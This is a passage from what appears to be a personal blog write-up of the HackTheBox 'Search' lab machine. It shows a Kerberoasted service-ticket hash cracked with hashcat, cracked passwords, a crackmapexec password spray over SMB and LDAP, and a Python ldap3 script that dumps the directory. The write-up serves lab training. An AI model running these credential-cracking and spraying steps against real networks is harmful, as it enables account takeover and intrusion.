+$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$61f39903aab6a849b2a91b1c1ecf3ec6$90d366d6c4993d131b57fd10763ae993fa6e8cbdaaa3d4553e8411712997eba69e23738370f1bc2d8e5773ae22a20452e7bb151879d7b28b77b89d1d4ffb603cdfe5ad9a08d2a5e479c3fdd3299e2079ba0f521cb4065b632ca889a990fa38ae898234ebd41a4883a132bb1e07efa0a11ed29a66090f1647bfe172dbc63c04f1ad4ec6b2ee5fee9fa6666520936703d2b0e59d08a5330a8fb5fc93dcc213bfa8bfff00be4ee9e3b7efa360a1587b216e63f8c8b97394307ea6ef13b11c2f6cccd5032794fb3e87a5d64f98e05924c35b919d78010a9b3872629a4eecf970066f29fc29a67a8953b7592e217ca2b1b2e2592f99d0857553aef8a9ac2a526c273583ccd8039270b65102545cb9cb9b09ac0f17712b110ab782e3560ee68efbf69bd59272dd8f4d752870011c78a3c47da9d46a1300745e9a84435fb8f7de6626750b1cc4e423377bfab2af2d80e49a231c3fa6dbf9edbe9821bd78a8a7605304085ad5168d21a3d9ecd84d3465c33ba31028a0d482e9f4cc67dc04252b2597d0a54a809325e63782ac1eb38c27cc6aff95cfdaeca7c5486299194789a831f8e93176443f892615baa6c503de3ded72dc9eedcf3d601302c6a10d55fcd6745792f8f0b856b121b08d5e4f0a8e816861843beed24806fccfcb42712be2dd8d7cb4e1ce51fb2452529c733d2c3a1b01be84e95c0407e31535d992f9c501b5d86c0c9ddfce38ed1bb233c7f5a85fe7ebcf4e1306a48323c1159525f76c17ec5213423fd21511baf7aa3ac38b98f7aa30e5e9b7d4f4be2416e4227cf16a1c63dbd18aff9cbaa5589383e09a61f0528f4d7327dd13f2614aba39e2edc2cd36c0328691da11503a7389f1a261d1dffe9d3f668a87286b50baabb4abc9def224aadfde83d758bab5ab0cd4d96e9771b5293dd72140c4223bf808084fac5b82788b732d4c72ef4cb17e071241023cb571bd25f88825357ff4deedfd62bc1d538e0af38f03b346f11a599b4941de56aae8f7591fcf89a7b2b36b9d5a68a31f67680dc2a221e71511f6f4cf87f836b31b1d9502cad2a80f1c2bfd692be8928e20450346b32f203347ce6722f094c94acfd66845626cfcfa86f8ec0a6271fd4c40d158a6a89842b0a14a2d0d5753ed4e58963bec98b66a538f8b9934650608eca8c0fe935e7f723e3c3e4558a3cf151fc3b194878dbdb6a05f373f065408ad52b5a4592f1028d941ec0950790f42993c5d6c24551ef5d3d006114bf2cb3bf2407661435e9e57c81c3d31d63cfdb3f1d499a82f69393299a6ae62c6e928d0e2875cc0f0bf5daef85616520649b2eb8ebe59002b7a11e9bdb550e13d113e56eb45d245048ac28d58c4acab751bfe2b934d092e7abdadafba955e7fc202345f3e400b04e627a45f7bc947894d032e521d4349d13e1a37996ccfe5d906ff7d990f0307098cc6a8bde32e561db0ea226094757fb541695e899c886c5a64ac
+
+</code></pre></div><h1 id="crack-tgs">Crack TGS<a href="#crack-tgs" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>                                                         
+└─$ hashcat -m <span style="color:#ae81ff">13100</span> hashes.kerberoast /usr/share/wordlists/rockyou.txt                            <span style="color:#ae81ff">1</span> ⚙ 
+hashcat <span style="color:#f92672">(</span>v6.1.1<span style="color:#f92672">)</span> starting... 
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: <span style="color:#ae81ff">14344392</span>
+* Bytes.....: <span style="color:#ae81ff">139921507</span>
+* Keyspace..: <span style="color:#ae81ff">14344385</span>
+* Runtime...: <span style="color:#ae81ff">1</span> sec
+
+$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$61f39903aab6a849b2a91b1c1ecf3ec6$90d366d6c4993d131b57fd10763ae993fa6e8cbdaaa3d4553e8411712997eba69e23738370f1bc2d8e5773ae22a20452e7bb151879d7b28b77b89d1d4ffb603cdfe5ad9a08d2a5e479c3fdd3299e2079ba0f521cb4065b632ca889a990fa38ae898234ebd41a4883a132bb1e07efa0a11ed29a66090f1647bfe172dbc63c04f1ad4ec6b2ee5fee9fa6666520936703d2b0e59d08a5330a8fb5fc93dcc213bfa8bfff00be4ee9e3b7efa360a1587b216e63f8c8b97394307ea6ef13b11c2f6cccd5032794fb3e87a5d64f98e05924c35b919d78010a9b3872629a4eecf970066f29fc29a67a8953b7592e217ca2b1b2e2592f99d0857553aef8a9ac2a526c273583ccd8039270b65102545cb9cb9b09ac0f17712b110ab782e3560ee68efbf69bd59272dd8f4d752870011c78a3c47da9d46a1300745e9a84435fb8f7de6626750b1cc4e423377bfab2af2d80e49a231c3fa6dbf9edbe9821bd78a8a7605304085ad5168d21a3d9ecd84d3465c33ba31028a0d482e9f4cc67dc04252b2597d0a54a809325e63782ac1eb38c27cc6aff95cfdaeca7c5486299194789a831f8e93176443f892615baa6c503de3ded72dc9eedcf3d601302c6a10d55fcd6745792f8f0b856b121b08d5e4f0a8e816861843beed24806fccfcb42712be2dd8d7cb4e1ce51fb2452529c733d2c3a1b01be84e95c0407e31535d992f9c501b5d86c0c9ddfce38ed1bb233c7f5a85fe7ebcf4e1306a48323c1159525f76c17ec5213423fd21511baf7aa3ac38b98f7aa30e5e9b7d4f4be2416e4227cf16a1c63dbd18aff9cbaa5589383e09a61f0528f4d7327dd13f2614aba39e2edc2cd36c0328691da11503a7389f1a261d1dffe9d3f668a87286b50baabb4abc9def224aadfde83d758bab5ab0cd4d96e9771b5293dd72140c4223bf808084fac5b82788b732d4c72ef4cb17e071241023cb571bd25f88825357ff4deedfd62bc1d538e0af38f03b346f11a599b4941de56aae8f7591fcf89a7b2b36b9d5a68a31f67680dc2a221e71511f6f4cf87f836b31b1d9502cad2a80f1c2bfd692be8928e20450346b32f203347ce6722f094c94acfd66845626cfcfa86f8ec0a6271fd4c40d158a6a89842b0a14a2d0d5753ed4e58963bec98b66a538f8b9934650608eca8c0fe935e7f723e3c3e4558a3cf151fc3b194878dbdb6a05f373f065408ad52b5a4592f1028d941ec0950790f42993c5d6c24551ef5d3d006114bf2cb3bf2407661435e9e57c81c3d31d63cfdb3f1d499a82f69393299a6ae62c6e928d0e2875cc0f0bf5daef85616520649b2eb8ebe59002b7a11e9bdb550e13d113e56eb45d245048ac28d58c4acab751bfe2b934d092e7abdadafba955e7fc202345f3e400b04e627a45f7bc947894d032e521d4349d13e1a37996ccfe5d906ff7d990f0307098cc6a8bde32e561db0ea226094757fb541695e899c886c5a64ac:@3ONEmillionbaby
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Hash.Target......: $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*...5a64ac
+Time.Started.....: Mon May  <span style="color:#ae81ff">2</span> 20:56:16 <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> secs<span style="color:#f92672">)</span>
+Time.Estimated...: Mon May  <span style="color:#ae81ff">2</span> 20:56:31 <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+Speed.#1.........:   785.3 kH/s <span style="color:#f92672">(</span>7.37ms<span style="color:#f92672">)</span> @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
+Progress.........: 11493376/14344385 <span style="color:#f92672">(</span>80.12%<span style="color:#f92672">)</span>
+Rejected.........: 0/11493376 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+Restore.Point....: 11485184/14344385 <span style="color:#f92672">(</span>80.07%<span style="color:#f92672">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+
+</code></pre></div><blockquote>
+<p>Password = @3ONEmillionbaby</p>
+</blockquote>
+<h1 id="password-spray">Password spray<a href="#password-spray" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="login-with-smb">login with SMB<a href="#login-with-smb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>CME needed that certain format and needed to be used with sudo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ sudo cme smb 10.10.11.129 -u hope.sharp -p <span style="color:#e6db74">&#39;IsolationIsKey?&#39;</span>                             <span style="color:#ae81ff">130</span> ⨯ <span style="color:#ae81ff">1</span> ⚙
+SMB         10.10.11.129    <span style="color:#ae81ff">445</span>    RESEARCH         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:RESEARCH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:search.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.11.129    <span style="color:#ae81ff">445</span>    RESEARCH         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> search.htb<span style="color:#ae81ff">\h</span>ope.sharp:IsolationIsKey? 
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ smbclient -L <span style="color:#ae81ff">\\</span>10.10.11.129<span style="color:#ae81ff">\\\\</span> -U Hope.Sharp 
+
+Enter WORKGROUP<span style="color:#ae81ff">\H</span>ope.Sharp<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        CertEnroll      Disk      Active Directory Certificate Services share
+        helpdesk        Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        RedirectedFolders$ Disk      
+        SYSVOL          Disk      Logon server share 
+</code></pre></div><h2 id="login-with-ldap">Login with ldap<a href="#login-with-ldap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>
+└─$ sudo cme ldap 10.10.11.129 -u actualUsers.txt -p <span style="color:#e6db74">&#39;IsolationIsKey?&#39;</span>                             <span style="color:#ae81ff">1</span> ⚙
+SMB         10.10.11.129    <span style="color:#ae81ff">445</span>    RESEARCH         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:RESEARCH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:search.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.11.129    <span style="color:#ae81ff">445</span>    RESEARCH         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> search.htb<span style="color:#ae81ff">\K</span>eely.Lyons:IsolationIsKey? 
+SMB         10.10.11.129    <span style="color:#ae81ff">445</span>    RESEARCH         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> search.htb<span style="color:#ae81ff">\D</span>ax.Santiago:IsolationIsKey? 
+SMB         10.10.11.129    <span style="color:#ae81ff">445</span>    RESEARCH         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> search.htb<span style="color:#ae81ff">\S</span>ierra.Frye:IsolationIsKey? 
+SMB         10.10.11.129    <span style="color:#ae81ff">445</span>    RESEARCH         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> search.htb<span style="color:#ae81ff">\a</span>dministrator:IsolationIsKey? 
+LDAP        10.10.11.129    <span style="color:#ae81ff">389</span>    RESEARCH         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> search.htb<span style="color:#ae81ff">\H</span>ope.Sharp:IsolationIsKey? 
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tom㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/search<span style="color:#f92672">]</span>                                                     
+└─$ python3 ldapenum.py                                                                     
+ldaps://10.10.11.129:3269 - ssl - user: search.htb<span style="color:#ae81ff">\H</span>ope.Sharp - not lazy - bound - open - &lt;local: 10.10.16.91:43145 - remote: 10.10.11.129:3269
+&gt; - tls not started - listening - SyncStrategy - internal decoder                              
+True                                                                                                 
+True                                                                                                 
+<span style="color:#f92672">[</span>DN: CN<span style="color:#f92672">=</span>Administrator,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>search,DC<span style="color:#f92672">=</span>htb - STATUS: Read - READ TIME: 2022-05-02T22:28:45.202826
+, DN: CN<span style="color:#f92672">=</span>Guest,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>search,DC<span style="color:#f92672">=</span>htb - STATUS: Read - READ TIME: 2022-05-02T22:28:45.202893
+, DN: CN<span style="color:#f92672">=</span>RESEARCH,OU<span style="color:#f92672">=</span>Domain Controllers,DC<span style="color:#f92672">=</span>search,DC<span style="color:#f92672">=</span>htb - STATUS: Read - READ TIME: 2022-05-02T22:28:45.202942
+, DN: CN<span style="color:#f92672">=</span>krbtgt,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>search,DC<span style="color:#f92672">=</span>htb - STATUS: Read - READ TIME: 2022-05-02T22:28:45.202985
+, DN: CN<span style="color:#f92672">=</span>COVID,CN<span style="color:#f92672">=</span>Co
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ldap3
+server <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Server(<span style="color:#e6db74">&#39;10.10.11.129&#39;</span>, get_info <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>ALL, port <span style="color:#f92672">=</span><span style="color:#ae81ff">3269</span>, use_ssl <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+connection <span style="color:#f92672">=</span> ldap3<span style="color:#f92672">.</span>Connection(server, user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;search.htb</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Hope.Sharp&#34;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IsolationIsKey?&#34;</span>, authentication<span style="color:#f92672">=</span>ldap3<span style="color:#f92672">.</span>NTLM)
+<span style="color:#75715e">#connection = ldap3.Connection(server, &#34;uid=Hope.Search,dc=search,dc=htb&#34;, &#34;IsolationIsKey?&#34;)</span>
+
+connection<span style="color:#f92672">.</span>bind()
+
+<span style="color:#75715e">#whoami = connection.extend.standard.who_am_i()</span>
+All <span style="color:#f92672">=</span> connection<span style="color:#f92672">.</span>search(search_base<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;DC=search,DC=htb&#39;</span>, search_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;(&amp;(objectClass=*))&#39;</span>, search_scope<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;SUBTREE&#39;</span>, attributes<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;*&#39;</span>)
+<span style="color:#75715e">#userEnum = connection.search(search_base=&#39;DC=search,DC=htb&#39;, search_filter=&#39;(&amp;(objectClass=person))&#39;, search_scope=&#39;SUBTREE&#39;, attributes=&#39;userPassword&#39;)</span>
+<span style="color:#75715e">#print(server.info)</span>
+<span style="color:#75715e">#print(All)</span>
+<span style="color:#75715e">#print(userEnum)</span>
+<span style="color:#75715e">#print(whoami)</span>
+print(connection<span style="color:#f92672">.</span>entries)
+</code></pre></div>
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
